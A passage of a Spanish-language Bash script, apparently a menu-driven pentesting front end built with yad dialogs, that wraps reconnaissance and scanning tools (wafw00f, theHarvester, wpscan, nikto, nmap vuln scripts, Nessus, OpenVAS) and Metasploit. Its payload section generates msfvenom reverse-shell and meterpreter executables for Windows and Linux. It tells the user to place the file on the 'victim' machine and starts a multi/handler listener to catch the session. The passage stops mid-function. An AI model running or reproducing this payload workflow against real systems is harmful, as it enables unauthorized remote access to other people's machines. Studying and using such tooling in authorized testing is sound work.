\t\t_____¶¶______¶¶¶_______________________¶
\t\t_____¶¶________¶¶____¶¶¶¶¶¶¶¶¶¶¶______¶
\t\t______¶¶________¶¶¶_____¶¶¶¶¶¶¶¶¶¶¶__¶
\t\t_______¶¶__________¶¶¶_____¶¶¶¶¶¶¶¶¶¶
\t\t_________¶¶___________¶¶¶¶¶__¶¶¶¶¶¶¶¶¶
\t\t_____________________________¶¶¶¶¶¶¶¶¶¶
\t\t______________________________¶¶¶¶¶¶¶¶¶
\t\t_______________________________¶¶¶¶¶¶¶"
linea

				sn=$(find / -type f -name "wafw00f" 2>/dev/null) 
							if [[ -z "$sn" ]]
								then
								      echo -e "*****Wafw00f NO está instalado*****"
								      sleep 2
								      linea
								      echo -e "\tInstalando......................."
								      linea
								      git clone https://github.com/EnableSecurity/wafw00f.git > /dev/null 2>&1
								      cd wafw00f
								      python setup.py install > /dev/null 2>&1
								      echo -e "Instalacion completa en ${yellow}$PWD${endColour}"  #PWD tiene que ir en mayuscula para ser ejecutado BASH  
								      export PATH=$PWD:$PATH

								else
								      pat=$(find / -type d -name "wafw00f" 2>/dev/null | head -1)   
								      export PATH=$pat:$PATH    #el directorio del ejecutable lo metemos en el PATH para que podamos ejecutarlo desde cualquier diretorio
								   
								fi

						url=$(yad --entry \
										--title="Wafw00f" \
							             --width=250 \
							             --height=80 \
							             --width=250 \
							             --button=Aceptar:0 \
							             --center \
							             --text-align=center \
							             --text="Introduce la URL de la siguiente manera: 
							             	http://URL
							             	https://URL ")

											ans=$?
											if [ $ans -eq 0 ]
											then
											linea
											echo -e "${yellow}[!]${endColour}Ejecuntándose......."
											linea
											sleep 2
												wafw00f -vv $url 2>/dev/null
												gathering
														
											else 
												menu
											fi
					
			}

			function theHarvester(){

echo -e "												

▀▀█▀▀ █──█ █▀▀ ░█─░█ █▀▀█ █▀▀█ ▀█─█▀ █▀▀ █▀▀ ▀▀█▀▀ █▀▀ █▀▀█ 
──█── █▀▀█ █▀▀ ░█▀▀█ █▄▄█ █▄▄▀ ─█▄█─ █▀▀ ▀▀█ ──█── █▀▀ █▄▄▀ 
──▀── ▀──▀ ▀▀▀ ░█─░█ ▀──▀ ▀─▀▀ ──▀── ▀▀▀ ▀▀▀ ──▀── ▀▀▀ ▀─▀▀"
linea

						url=$(yad --entry \
										--title="TheHarvester" \
							             --width=250 \
							             --height=80 \
							             --width=250 \
							             --button=Aceptar:0 \
							             --center \
							             --text-align=center \
							             --text="Introduce la URL")

											ans=$?
											if [ $ans -eq 0 ]
											then
												sudo theHarvester -d $url -l 200 -b all 2>/dev/null
												gathering
														
											else 
												menu
											fi					
			}


function vuln(){
	tools_rec=$(yad --center --width=700 --height=300 --list --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" --text="Vulnerabilidades" --button=Aceptar:0 --button=Atrás:1 --separator= --column="Tools" Gestores\ de\ contenidos Nikto Nmap\ Vuln Nessus Openvas)

	case $tools_rec in
		Gestores\ de\ contenidos)
			gestores
		;;
		Nikto)
			nikto
		;;
		Nmap\ Vuln)
			NmapVuln
		;;
		Nessus)
			Nessus
		;;
		Openvas)
			Openvas
		;;
		*)
			menu
		;;
	esac
}


			function gestores(){

				accion=$(yad --list --title="Gestores de contenidos" --text="Análisis" --center --width=700 --height=300 --button=Aceptar:0 --button=Atrás:1 --separator= --column="Acciones" WordPress Joomla! Drupal)

				case $accion in
					WordPress)
echo -e "
\t\t▒█░░▒█ ▒█▀▀█ ▒█▀▀▀█ █▀▀ █▀▀█ █▀▀▄ 
\t\t▒█▒█▒█ ▒█▄▄█ ░▀▀▀▄▄ █░░ █▄▄█ █░░█ 
\t\t▒█▄▀▄█ ▒█░░░ ▒█▄▄▄█ ▀▀▀ ▀░░▀ ▀░░▀"
linea						
							url=$(yad --entry \
										--title="WordPress" \
							             --width=250 \
							             --height=80 \
							             --width=250 \
							             --button=Aceptar:0 \
							             --center \
							             --text-align=center \
							             --text="Introduce la URL")

											ans=$?
											if [ $ans -eq 0 ]
											then
												sleep 2
												echo -e "${yellow}[!]${endColour} Actualizando herramienta..."
												wpscan --update 1>/dev/null
												echo -e "${yellow}[!]${endColour} Analizando ..."
														if [[ $(wpscan --url $url -e vp,u | grep "not seem to be running WordPress" | wc -l) > 0 ]] #wc -l cuenta numero de lineas
																then 
																	echo -e "\n${yellow}[!]${endColour}El gestor de contenido utilizado \033[4mNO\033[0m es \033[4mWORDPRESS\033[0m\n"  #ponemos el texto en color verde
																	vuln
														elif [[ $(wpscan --url $url -e vp,u | grep "this might be due to a WAF" | wc -l) > 0 ]]; then
																	echo -e "\n${yellow}[!]${endColour}Es un WORDPRESS pero hay que forzar el análisis ante un posible WAF\n"
																	sleep 2
																	linea
																	echo -e "\t\tforzando análisis.........."
																	linea
																	sleep 2
																	wp="wpscan --url $url -e vp,u --random-user-agent --force"
																	eval $wp 2>/dev/null
																	vuln					
														else 			
															wpscan --url $url -e vp,u 2>/dev/null #para usuarios y vulnerabilidades

															vuln															
														fi
											else 
												menu
											fi
					;;
					Joomla!)
echo -e "

\t\t───░█ █▀▀█ █▀▀█ █▀▄▀█ █▀▀ █▀▀ █▀▀█ █▀▀▄  
\t\t─▄─░█ █──█ █──█ █─▀─█ ▀▀█ █── █▄▄█ █──█  
\t\t░█▄▄█ ▀▀▀▀ ▀▀▀▀ ▀───▀ ▀▀▀ ▀▀▀ ▀──▀ ▀──▀ "
linea
							url=$(yad --entry \
										--title="Joomla!" \
							             --width=250 \
							             --height=80 \
							             --width=250 \
							             --button=Aceptar:0 \
							             --center \
							             --text-align=center \
							             --text="Introduce la URL")

											ans=$?
											if [ $ans -eq 0 ]
											then

												sleep 2
												echo -e "${yellow}[!]${endColour} Analizando ..."
														if [[ $(joomscan -u $url  | grep "The target is not alive!" | wc -l) > 0 ]] 
																then 
																	echo -e "\n${yellow}[!]${endColour}\t\033[4mNO\033[0m se encuentra el gestor de contenido\n"
																	vuln		
														else 			
															joomscan -u $url 2>/dev/null #para usuarios y vulnerabilidades

															vuln															
														fi
											else 
												menu
											fi
					;;
					Drupal) #faltaria un control de error para cuando no fuera drupal el gestor.
# Han salido errores, algunas veces si otras veces no, posiblemente sea de permisos, OBSERVARLO!!!!!!solucion cambiando permisos de los ficheros droopescan para en vez de que este como el usuario normal este como root, "sudo chown root:root -R <carpeta>" con el -R cambia todo el contenido

echo -e "												
\t\t█▀▄ █▀█ █▀█ █▀█ █▀█ █▀▀ █▀ █▀▀ ▄▀█ █▄░█
\t\t█▄▀ █▀▄ █▄█ █▄█ █▀▀ ██▄ ▄█ █▄▄ █▀█ █░▀█"
linea
sleep 1
echo -e "${yellow}[!]${endColour}Espere un momento mientras se comprueba que la herramienta se encuentra instalada\n"
sleep 1
echo -e "${yellow}[!]${endColour}El proceso puede demorarse ya que la búsqueda la realiza desde la raiz del sistema\n"
sleep 1
echo -e "${yellow}[!]${endColour}Wait please.........."
sleep 1
linea
echo -e "
\t\t\t─────▄██▀▀▀▀▀▀▀▀▀▀▀▀▀██▄─────
\t\t\t────███───────────────███────
\t\t\t───███─────────────────███───
\t\t\t──███───▄▀▀▄─────▄▀▀▄───███──
\t\t\t─████─▄▀────▀▄─▄▀────▀▄─████─
\t\t\t─████──▄████─────████▄──█████
\t\t\t█████─██▓▓▓██───██▓▓▓██─█████
\t\t\t█████─██▓█▓██───██▓█▓██─█████
\t\t\t█████─██▓▓▓█▀─▄─▀█▓▓▓██─█████
\t\t\t████▀──▀▀▀▀▀─▄█▄─▀▀▀▀▀──▀████
\t\t\t███─▄▀▀▀▄────███────▄▀▀▀▄─███
\t\t\t███──▄▀▄─█──█████──█─▄▀▄──███
\t\t\t███─█──█─█──█████──█─█──█─███
\t\t\t███─█─▀──█─▄█████▄─█──▀─█─███
\t\t\t███▄─▀▀▀▀──█─▀█▀─█──▀▀▀▀─▄███
\t\t\t████─────────────────────████
\t\t\t─███───▀█████████████▀───████
\t\t\t─███───────█─────█───────████
\t\t\t─████─────█───────█─────█████
\t\t\t───███▄──█────█────█──▄█████─
\t\t\t─────▀█████▄▄███▄▄█████▀─────
\t\t\t──────────█▄─────▄█──────────
\t\t\t──────────▄█─────█▄──────────
\t\t\t───────▄████─────████▄───────
\t\t\t─────▄███████───███████▄─────
\t\t\t───▄█████████████████████▄───
\t\t\t─▄███▀───███████████───▀███▄─
\t\t\t███▀─────███████████─────▀███
\t\t\t▌▌▌▌▒▒───███████████───▒▒▐▐▐▐
\t\t\t─────▒▒──███████████──▒▒─────
\t\t\t──────▒▒─███████████─▒▒──────
\t\t\t───────▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒───────
\t\t\t─────────████░░█████─────────
\t\t\t────────█████░░██████────────
\t\t\t──────███████░░███████───────
\t\t\t─────█████──█░░█──█████──────
\t\t\t─────█████──████──█████──────
\t\t\t──────████──████──████───────
\t\t\t──────████──████──████───────
\t\t\t──────████───██───████───────
\t\t\t──────████───██───████───────
\t\t\t──────████──████──████───────
\t\t\t─██────██───████───██─────██─
\t\t\t─██───████──████──████────██─
\t\t\t─███████████████████████████─
\t\t\t─██─────────████──────────██─
\t\t\t─██─────────████──────────██─
\t\t\t────────────████─────────────
\t\t\t─────────────██──────────────
"
linea
							 
							sn=$(find / -type d -name "droopescan" 2>/dev/null)
							if [[ -z "$sn" ]]
								then
								      echo -e "*****DROOPESCAN NO está instalado*****"
								      sleep 2
								      linea
								      echo -e "\tInstalando......................."
								      linea
								      git clone https://github.com/droope/droopescan.git > /dev/null 2>&1
								      cd droopescan
								      pip3 install -r requirements.txt > /dev/null 2>&1
								      echo -e "Instalacion completa en ${yellow}$PWD${endColour}"  #PWD tiene que ir en mayuscula para ser ejecutado BASH  
								      export PATH=$PWD:$PATH

								else
								      pat=$(find / -type d -name "droopescan" 2>/dev/null | head -1)   
								      export PATH=$pat:$PATH    #el directorio del ejecutable lo metemos en el PATH para que podamos ejecutarlo desde cualquier diretorio
								fi

						url=$(yad --entry \
										--title="Drupal" \
							             --width=250 \
							             --height=80 \
							             --width=250 \
							             --button=Aceptar:0 \
							             --button=Cancelar:1 \
							             --center \
							             --text-align=center \
							             --text="Introduce la URL")

											ans=$?
											if [ $ans -eq 0 ]
											then
												sudo droopescan scan drupal -u $url 2>/dev/null
												vuln
														
											else 
												menu
											fi
					;;
					*)
						vuln
					;;
				esac
			}


			function nikto(){
echo -e "
\t\t\t░█▄─░█ ─▀─ █─█ ▀▀█▀▀ █▀▀█ 
\t\t\t░█░█░█ ▀█▀ █▀▄ ──█── █──█ 
\t\t\t░█──▀█ ▀▀▀ ▀─▀ ──▀── ▀▀▀▀"
linea	
				
				url=$(yad --entry \
					--title="Nikto" \
					--width=250 \
					--height=80 \
					--width=250 \
					--button=Aceptar:0 \
					--center \
					--text-align=center \
					--text="Introduce la URL")

						ans=$?
						if [ $ans -eq 0 ]
							then

							sleep 2
							echo -e "${yellow}[!]${endColour} Analizando ..."
							sleep 2
							sudo nikto -h $url #para nikto hay que especificar el sudo para que se pueda ejecutar desde aquí
							vuln
						else
							vuln
						fi
			}








			function NmapVuln(){

echo -e "
█▄░█ █▀▄▀█ ▄▀█ █▀█   █░█ █░█ █░░ █▄░█ █▀▀ █▀█ ▄▀█ █▄▄ █ █░░ █ ▀█▀ █ █▀▀ █▀
█░▀█ █░▀░█ █▀█ █▀▀   ▀▄▀ █▄█ █▄▄ █░▀█ ██▄ █▀▄ █▀█ █▄█ █ █▄▄ █ ░█░ █ ██▄ ▄█"
linea
echo -e "\n${yellow}[!]${endColour}\033[1mEl siguiente escaneo descubrirá las vulnerabilidades más conocidas\033[1m\n"
linea
sleep 3


			yad --title="Nmap" \
						    --center \
						    --width=250 \
						    --height=80 \
						    --text-align=center \
						    --text="¿Que deseas introducir?" \
						    --button="Una IP":0 \
						    --button="Un dominio":1
						ans=$?
						if [ $ans -eq 0 ]
							then
								ip_intro
								directorio 
								mkdir $dir/nmapvuln 2>/dev/null

							puerto=$(yad --entry \
				             --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" \
				             --image=gtk-info \
				             --width=250 \
				             --height=80 \
				             --width=250 \
				             --button="Escanear puertos introducidos":0 \
				             --button="Escanear todo el rango":1 \
				             --center \
				             --text-align=center \
				             --text="Introduce a continuación los puertos que quieres escanear")
									ans=$?
									if [ $ans -eq 0 ]
									then
										es_numero='^[0-9,]+$' # solo podremos introducir numeros y comas
										if [[ $puerto =~ $es_numero ]] ; then
										   ins="nmap --script=vuln -p$puerto $ip -oA $dir/nmapvuln/vulnNAMP"
									   		eval $ins
									   		vuln
										 else
										 	echo -e "${yellow}[!]${endColour}ERROR, hay que introducir números separados con comas\n Ejemplo: 20,80,21"
										 	vuln
										fi
									    
									else
									    ins="nmap --script=vuln $ip -oA $dir/nmapvuln/vulnNAMP"
									    eval $ins
									    vuln
									fi
							else
								dom
								directorio 
								mkdir $dir/nmapvuln 2>/dev/null

							puerto=$(yad --entry \
				             --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" \
				             --image=gtk-info \
				             --width=250 \
				             --height=80 \
				             --width=250 \
				             --button="Escanear puertos introducidos":0 \
				             --button="Escanear todo el rango":1 \
				             --center \
				             --text-align=center \
				             --text="Introduce a continuación los puertos que quieres escanear")
									ans=$?
									if [ $ans -eq 0 ]
									then
										es_numero='^[0-9,]+$' # solo podremos introducir numeros y comas
										if [[ $puerto =~ $es_numero ]] ; then
										   ins="nmap --script=vuln -p$puerto $domain -oA $dir/nmapvuln/vulnNAMP"
									   		eval $ins
									   		vuln
										 else
										 	echo -e "${yellow}[!]${endColour}ERROR, hay que introducir números separados con comas\n Ejemplo: 20,80,21"
										 	vuln
										fi
									    
									else
									    ins="nmap --script=vuln $domain -oA $dir/nmapvuln/vulnNAMP"
									    eval $ins
									    vuln
									fi
							fi

			}


			function Nessus(){
echo -e "
\t\t░█▄─░█ █▀▀ █▀▀ █▀▀ █──█ █▀▀ 
\t\t░█░█░█ █▀▀ ▀▀█ ▀▀█ █──█ ▀▀█ 
\t\t░█──▀█ ▀▀▀ ▀▀▀ ▀▀▀ ─▀▀▀ ▀▀▀"
linea				
sleep 1
echo -e "${yellow}[!]${endColour}Espere un momento mientras se comprueba que la herramienta se encuentra instalada\n"
sleep 1

			
						sn=$(/bin/systemctl start nessusd.service 2>&1) #guardara la salida de error estándar

							if [[ "$sn" == 'Failed to start nessusd.service: Unit nessusd.service not found.' ]]
								then
								      echo -e "*****Nessus NO está instalado*****\n"
								      sleep 2
								      echo -e "${yellow}[!]${endColour}Tienes que descargarte el paquete de instalación manualmente desde: https://www.tenable.com/downloads/nessus?loginAttempted=true\n"
								      sleep 2
								      echo -e "\tLuego procede con la instalación de la siguiente forma:"
								      echo -e "\t-*chmod +x *"
								      echo -e "\t-*dpkg -i <archivo .deb descargado>"
								      linea
								      echo -e "\tVuelva a ejecutar la herramienta Nessus"
										vuln
								else
							      	/bin/systemctl start nessusd.service > /dev/null 2>&1 &
									#disown da problemas en parrot, en kali funciona, para que funcione en ambas utilizamos al final &, para poner en segundo plano
									xdg-open "https://localhost:8834" 2>/dev/null &
									echo -e "${yellow}[!]${endColour}Proceso independizado, espere que se abra en el navegador"
									sleep 2
									echo -e "${yellow}[!]${endColour}Podemos seguir utilizando la herramienta"
									vuln
								fi

						
			}

			function Openvas(){
echo -e "
\t\t▒█▀▀▀█ █▀▀█ █▀▀ █▀▀▄ ▒█░░▒█ █▀▀█ █▀▀ 
\t\t▒█░░▒█ █░░█ █▀▀ █░░█ ░▒█▒█░ █▄▄█ ▀▀█ 
\t\t▒█▄▄▄█ █▀▀▀ ▀▀▀ ▀░░▀ ░░▀▄▀░ ▀░░▀ ▀▀▀"
linea

				texto="<span weight=\"bold\" foreground=\"green\">¿Tienes instalado Openvas?</span>"
							yad --title="" \
    						--image=gtk-info \
    						--width=250 \
   							--height=80 \
						    --button=SI:0 \
						    --button=NO:1 \
						    --center \
						    --text-align=center \
						    --text="${texto}"

				ans=$?
				if [ $ans -eq 0 ]
				then

				    gvm-start > /dev/null 2>&1 &
#disown da problemas en parrot, en kali funciona, para que funcione en ambas utilizamos al final &, para poner en segundo plano
				    xdg-open "https://localhost:9392" 2>/dev/null &
echo -e "${yellow}[!]${endColour}Proceso independizado, espere que se abra en el navegador"
echo -e "${yellow}[!]${endColour}Podemos seguir utilizando la herramienta"					
vuln

				else
					echo "*******************************IMPORTANTE****************************************"
					echo "---------------------------------------------------------------------------------"
					echo "Si al instalar gvm-setup, salta error de postgresql version 13"
					echo "---------------------------------------------------------------------------------"
					echo "posible solución:"
					echo "Desinstalar openvas: $ sudo apt-get purge openvas"
					echo "$ sudo apt autoremove"
					echo "$ sudo apt clean"
					echo "$ dpkg -l | grep postgres"
					echo "Borrar con $ sudo apt-get --purge"
					echo "todo lo que nos ha aparecido con el comando dpkg anterior"
					echo "$ sudo apt-get update"
					echo "$ sudo apt autoremove"
					echo "Reiniciamos la máquina"
					echo "sudo apt install openvas"
					echo "sudo gvm-setup"

					read -rsp $'Pulsa ENTER para continuar... \n'

				    sudo apt update
				    sudo apt upgrade
				    sudo apt autoremove
				    sudo apt install openvas
				    sudo gvm-setup

				    echo "----------------------------------------------------------------------------------------"
				    read -rsp $'Si todo ha ido bien......apunta la PASSWORD y pulsa ENTER para continuar... \n'
				    echo "----------------------------------------------------------------------------------------"

				    sudo gvm-start
				    sudo gvm-stop
				    sudo gvm-start > /dev/null 2>&1 &
				    disown
				    xdg-open "https://localhost:9392" 2>/dev/null &
				    echo -e "${yellow}[!]${endColour}Proceso independizado, espere que se abra en el navegador"
					echo -e "${yellow}[!]${endColour}Podemos seguir utilizando la herramienta"
					vuln
				fi
				
			}


function exploit(){
	tools_rec=$(yad --center --width=700 --height=300 --list --title="𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥" --text="Explotación" --button=Aceptar:0 --button=Atrás:1 --separator= --column="Tools" Metasploit Búsqueda\ de\ exploit Payload'(Msfvenom)')

	case $tools_rec in
		Metasploit)
			Metasploit
		;;
		Búsqueda\ de\ exploit)
			Basesdatos
		;;
		Payload'(Msfvenom)')
			Payload
		;;
		*)
			menu
		;;
	esac
}


			function Metasploit(){
echo -e "
\t\t░█▀▄▀█ █▀▀ ▀▀█▀▀ █▀▀█ █▀▀ █▀▀█ █── █▀▀█ ─▀─ ▀▀█▀▀ 
\t\t░█░█░█ █▀▀ ──█── █▄▄█ ▀▀█ █──█ █── █──█ ▀█▀ ──█── 
\t\t░█──░█ ▀▀▀ ──▀── ▀──▀ ▀▀▀ █▀▀▀ ▀▀▀ ▀▀▀▀ ▀▀▀ ──▀──"
linea

				service postgresql start > /dev/null 2>&1 &
				echo -e "${yellow}[!]${endColour}Espere un momento, abriendo Metasploit en un terminal nuevo\n"
				gnome-terminal -- msfconsole 2>/dev/null & #abrimos metasploit en un terminal nuevo
				sleep 3
				echo -e "${yellow}[!]${endColour}Proceso terminado, podemos seguir utilizando la herramienta paralelamente con Metasploit"
				exploit
			}


			function Basesdatos(){
echo -e "
\t░█▀▀█ ░█▀▀█ ░█▀▀▄ ░█▀▀▄ 　 █▀▀ █─█ █▀▀█ █── █▀▀█ ─▀─ ▀▀█▀▀ 
\t░█▀▀▄ ░█▀▀▄ ░█─░█ ░█─░█ 　 █▀▀ ▄▀▄ █──█ █── █──█ ▀█▀ ──█── 
\t░█▄▄█ ░█▄▄█ ░█▄▄▀ ░█▄▄▀ 　 ▀▀▀ ▀─▀ █▀▀▀ ▀▀▀ ▀▀▀▀ ▀▀▀ ──▀──"
linea
				mensaje=$(yad --list \
				 --title="Bases de datos" \
                 --height=200 \
                 --width=100 \
                 --button=Aceptar:0 \
                 --button=Cancelar:1 \
                 --center \
                 --text="¿Donde buscar el exploit?" \
                 --radiolist \
                 --column="" \
                 --column="Bases de Datos" \
                 1 "exploit-db" 2 "es.0day.today" 3 "rapid7" 4 "vuldb")

			
               ans=$?
					if [ $ans -eq 0 ]
					then
					    if [[ $mensaje =~ "exploit-db" ]]
					    then
					    	xdg-open "https://www.exploit-db.com/" 2>/dev/null &
					    	Basesdatos

					    elif [[ $mensaje =~ "es.0day.today" ]] 
					    then
							xdg-open "https://es.0day.today/" 2>/dev/null &
							Basesdatos

						elif [[ $mensaje =~ "rapid7" ]]
					    then
							xdg-open "https://www.rapid7.com/db/" 2>/dev/null &
							Basesdatos

						elif [[ $mensaje =~ "vuldb" ]]
					    then
							xdg-open "https://vuldb.com/" 2>/dev/null &
							Basesdatos

					    fi
					else
						exploit
						
					fi
				}

	
			function Payload(){
echo -e "
\t\t▒█▀▄▀█ █▀▀ █▀▀ ▀█░█▀ █▀▀ █▀▀▄ █▀▀█ █▀▄▀█ 
\t\t▒█▒█▒█ ▀▀█ █▀▀ ░█▄█░ █▀▀ █░░█ █░░█ █░▀░█ 
\t\t▒█░░▒█ ▀▀▀ ▀░░ ░░▀░░ ▀▀▀ ▀░░▀ ▀▀▀▀ ▀░░░▀"
linea

				mensaje=$(yad --list \
				 --title="Payload" \
                 --height=200 \
                 --width=100 \
                 --button=Aceptar:0 \
                 --button=Cancelar:1 \
                 --center \
                 --text="Introduce Payload" \
                 --radiolist \
                 --column="" \
                 --column="Sistema Operativo" \
                 1 "Windows" 2 "Linux")

			
               ans=$?
					if [[ $ans -eq 0 && $mensaje =~ "Windows" ]]
					then
						
						mensajewindows=$(yad --list \
								--title="Payload" \
				                 --height=400 \
				                 --width=500 \
				                 --button=Introducir\ Manualmente:2 \
				                 --button=Aceptar:0 \
				                 --button=Cancelar:1 \
				                 --center \
				                 --text="Payload" \
				                 --radiolist \
				                 --column="" \
				                 --column="Selecciona:" \
				                 1 "windows/meterpreter/bind_tcp" 2 "windows/meterpreter/reverse_http" 3 "windows/meterpreter/reverse_https" 4 "windows/meterpreter/reverse_tcp" 5 "windows/meterpreter_bind_tcp" 6 "windows/meterpreter_reverse_http" 7 "windows/meterpreter_reverse_https" 8 "windows/meterpreter_reverse_tcp" 10 "windows/powershell_bind_tcp" 11 "windows/powershell_bind_tcp" 12 "windows/shell/bind_tcp" 13 "windows/shell/reverse_tcp" 14 "windows/shell/reverse_udp" 15 "windows/shell_bind_tcp" 16 "windows/shell_reverse_tcp" 17 "windows/x64/meterpreter/bind_tcp" 18 "windows/x64/meterpreter/reverse_http" 19 "windows/x64/meterpreter/reverse_https" 20 "windows/x64/meterpreter/reverse_tcp" 21 "windows/x64/meterpreter_bind_tcp" 22 "windows/x64/meterpreter_reverse_http" 23 "windows/x64/meterpreter_reverse_https" 24 "windows/x64/meterpreter_reverse_tcp" 25 "windows/x64/powershell_bind_tcp" 26 "windows/x64/powershell_reverse_tcp" 27 "windows/x64/shell/bind_tcp" 28 "windows/x64/shell/reverse_tcp" 29 "windows/x64/shell_bind_tcp" 30 "windows/x64/shell_reverse_tcp")

				                 ans1=$?
										if [ $ans1 -eq 0 ]
										then
											inswin=${mensajewindows#T*|} #quita del principio el TRUE |
											inswin2=${inswin%|} #quita del final |
											evalwin=$inswin2 #me queda solo el payload a utilizar

										elif [ $ans1 -eq 2 ]
										then
											manual=$(yad --entry \
											--title="Payload" \
								             --image=gtk-info \
								             --width=250 \
								             --height=80 \
								             --width=250 \
								             --button=Aceptar:0 \
								             --button=Cancelar:1 \
								             --center \
								             --text-align=center \
								             --text="Introduce manualmente el payload")

												ans=$?
												if [ $ans -eq 0 ]
												then
												    insmanual=$manual
												
												else
												    Payload
												fi


										else
											Payload
										fi
						ip

						port

						extension

						ejecutable


						if [[ $insmanual && $insmanualext ]];then #las dos variables contienen datos
							msfvenom -p $insmanual lhost=$insip lport=$insport --format $insmanualext -o $inseje.$insmanualext
						elif [[ $insmanual || $insmanualext ]];then #elegirá la variable que contenga algo
							if [ $insmanual ];then
								msfvenom -p  $insmanual lhost=$insip lport=$insport --format $evalexte -o $inseje.$evalexte
							else
								msfvenom -p  $evalwin lhost=$insip lport=$insport --format $insmanualext -o $inseje.$insmanualext
							fi

						else #ninguna de las dos variables tienen datos
							msfvenom -p  $evalwin lhost=$insip lport=$insport --format $evalexte -o $inseje.$evalexte
						fi
						

						texto="<span weight=\"bold\" foreground=\"yellow\"> Introduce el PAYLOAD en el equipo victima </span>"
							yad --title="Payload" \
							    --image=gtk-info \
							    --width=250 \
							    --height=80 \
							    --button=Continuar:0 \
							    --button=Cancelar:1 \
							    --center \
							    --text-align=center \
							    --text="${texto}"

							ans=$?
							if [ $ans -eq 0 ]
							then
							   	echo "use exploit/multi/handler
								set PAYLOAD " ""$evalwin"
								set LHOST" ""$insip"
								set LPORT" ""$insport"
								exploit" | tee listen.rc >/dev/null #sobreescribe en el fichero (tee) y con (>/dev....) evitamos ver el echo

							msfconsole -r listen.rc
							exploit

							else 
								# borramos el contenido que hubiera en las variables para que no se queden guardadas
								insmanual=$"" 
								insmanualext=$""
								exploit
							fi


					elif [[ $ans -eq 0 && $mensaje =~ "Linux" ]]
					then
						mensajelinux=$(yad --list \
								--title="Payload" \
				                 --height=400 \
				                 --width=500 \
				                 --button=Introducir\ Manualmente:2 \
				                 --button=Aceptar:0 \
				                 --button=Cancelar:1 \
				                 --center \
				                 --text="Payload" \
				                 --radiolist \
				                 --column="" \
				                 --column="Selecciona:" \
				                 1 "linux/x64/exec" 2 "linux/x64/meterpreter/bind_tcp" 3 "linux/x64/meterpreter/reverse_tcp" 4 "linux/x64/meterpreter_reverse_http" 5 "linux/x64/meterpreter_reverse_https" 6 "linux/x64/shell/reverse_tcp" 7 "linux/x64/shell/bind_tcp" 8 "linux/x64/shell_bind_tcp" 9 "linux/x64/shell_reverse_ipv6_tcp" 10 "linux/x64/shell_reverse_tcp" 11 "linux/x86/exec" 12 "linux/x86/meterpreter/bind_tcp" 13 "linux/x86/meterpreter/reverse_tcp" 14 "linux/x86/meterpreter_reverse_http" 15 "linux/x86/meterpreter_reverse_https" 16 "linux/x86/meterpreter_reverse_tcp" 17 "linux/x86/shell/bind_tcp" 18 "linux/x86/shell/reverse_ipv6_tcp" 19 "linux/x86/shell/reverse_tcp" 20 "linux/x86/shell_bind_tcp" 21 "linux/x86/shell_reverse_tcp")				                 

				                 ans1=$?
										if [ $ans1 -eq 0 ]
										then
											inslin=${mensajelinux#T*|} #quita del principio el TRUE |
											inslin2=${inslin%|} #quita del final |
											evalin=$inslin2 #me queda solo el payload a utilizar

										elif [ $ans1 -eq 2 ]
										then
											manual=$(yad --entry \
											--title="Payload" \
								             --image=gtk-info \
								             --width=250 \
								             --height=80 \
								             --width=250 \
								             --button=Aceptar:0 \
								             --button=Cancelar:1 \
								             --center \
								             --text-align=center \
								             --text="Introduce manualmente el payload")

												ans=$?
												if [ $ans -eq 0 ]
												then
												    insmanual=$manual
												
												else
												    Payload
												fi

										else
											Payload
										fi
					
						ip

						port

						extension

						ejecutable

						if [[ $insmanual && $insmanualext ]];then #las dos variables contienen datos
							msfvenom -p $insmanual lhost=$insip lport=$insport --format $insmanualext -o $inseje.$insmanualext
						elif [[ $insmanual || $insmanualext ]];then 
							if [ $insmanual ];then
								msfvenom -p  $insmanual lhost=$insip lport=$insport --format $evalexte -o $inseje.$evalexte
							else
								msfvenom -p  $evalwin lhost=$insip lport=$insport --format $insmanualext -o $inseje.$insmanualext
							fi

						else #ninguna de las dos variables tienen datos
							msfvenom -p  $evalwin lhost=$insip lport=$insport --format $evalexte -o $inseje.$evalexte
						fi
		
						texto="<span weight=\"bold\" foreground=\"yellow\"> Introduce el PAYLOAD en el equipo victima</span>"
							yad --title="Payload" \
							    --image=gtk-info \
							    --width=250 \
							    --height=80 \
							    --button=Continuar:0 \
							    --button=Atras:1 \
							    --center \
							    --text-align=center \
							    --text="${texto}"

							ans=$?
							if [ $ans -eq 0 ]
							then
							   	echo "use exploit/multi/handler
								set PAYLOAD " ""$evalin"
								set LHOST" ""$insip"
								set LPORT" ""$insport"
								exploit" | tee listen.rc >/dev/null #sobreescribe en el fichero (tee) y con (>/dev....) evitamos ver el echo

								msfconsole -r listen.rc
								exploit

							else 
								# borramos el contenido que hubiera en las variables para que no se queden guardadas
								insmanual=$"" 
								insmanualext=$""
								exploit
							fi 
					else
						exploit
					fi

							}

#****************************************************************************funciones generales para PAYLOAD**************************************************************************************************************

function ip (){
	test='([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])'
						mensajeip=$(yad --entry \
								--title="Payload" \
					             --image=imagenes/icoip.ico \
					             --width=250 \
					             --height=80 \
					             --width=250 \
					             --button=Aceptar:0 \
					             --button=Cancelar:1 \
					             --center \
					             --text-align=center \
					             --text="Introduce tu IP")

									ans=$?
									if [ $ans -eq 0 ]
									then
										if [[ $mensajeip =~ ^$test\.$test\.$test\.$test$ ]]  #valida si se ha introducido una IP
										then
									    	insip=$mensajeip
										else
											texto="<span weight=\"bold\" foreground=\"red\">IP NO VÁLIDA</span>" #me muestra un error para que vuelva a meter la IP
											yad --title="ERROR" \
								    			--image=gtk-info \
								    			--width=250 \
								    			--height=80 \
								    			--button=OK:0 \
								    			--center \
								    			--text-align=center \
								    			--text="${texto}"

												ans=$?	

												if [ $ans -eq 0 ]								
													then
								    					ip
												fi
										fi
									else
										Payload
									
									fi

									}


function port (){
						mensajeport=$(yad --entry \
								--title="Payload" \
					             --image=imagenes/puerto.ico \
					             --width=250 \
					             --height=80 \
					             --width=250 \
					             --button=Aceptar:0 \
					             --button=Cancelar:1 \
					             --center \
